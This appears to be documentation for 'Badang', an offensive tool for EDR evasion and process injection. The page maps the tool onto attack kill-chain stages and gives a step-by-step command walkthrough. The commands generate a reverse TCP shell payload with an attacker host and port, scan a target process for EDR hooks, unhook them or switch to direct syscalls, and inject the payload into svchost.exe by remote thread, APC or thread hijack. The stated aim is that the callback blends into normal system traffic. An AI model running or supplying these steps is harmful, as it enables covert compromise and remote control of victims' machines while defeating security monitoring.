# Badang in the Kill Chain

## Stages

```
1. Initial Access         — phishing, exploit, creds (not Badang)
2. Payload Generation     ← badang generate
3. Recon Target Process   ← badang analyze
4. EDR Bypass             ← badang unhook / syscall
5. Injection              ← badang inject
6. Post-Exploitation      — C2, lateral movement (not Badang)
```

Badang covers stages 2–5: the hardest part where EDR evasion matters.

## Example Operation

```bash
# Step 1: Generate a reverse shell payload
badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin

# Step 2: Find a target process (svchost.exe, explorer.exe)
# Note its PID from Task Manager

# Step 3: Scan for hooks
badang-cli analyze --pid 1234 -x -c
# Result: NtCreateThreadEx HOOKED, NtWriteVirtualMemory HOOKED

# Step 4: Bypass the EDR
# Option A: Remove the hooks
badang-cli unhook --unhook NtCreateThreadEx -x -c
# Option B: Use direct syscall (skip ntdll)
badang-cli syscall --func NtCreateThreadEx -x -c

# Step 5: Inject (pick a technique)
badang-cli inject --pid 1234 --technique createremote --payload rev.bin -x -c
# Or: APC injection (queues to alertable threads, no new thread)
badang-cli inject --pid 1234 --technique apc --payload rev.bin -x -c
# Or: Thread hijack (redirects existing thread, hardest to detect)
badang-cli inject --pid 1234 --technique hijack --payload rev.bin -x -c

# Step 6: Reverse shell connects back from svchost.exe
# Looks like normal system traffic to EDR and network monitors
```

## With vs Without Badang

| Without | With |
|---------|------|
| msfvenom payload → known signatures | Custom shellcode, no signatures |
| Inject blind → EDR catches API call | Analyze first, know what's watched |
| EDR hooks block you → operation fails | Unhook/Syscall bypasses hooks |
| Run as yourself → easy to find | Inject into legit process → blends in |
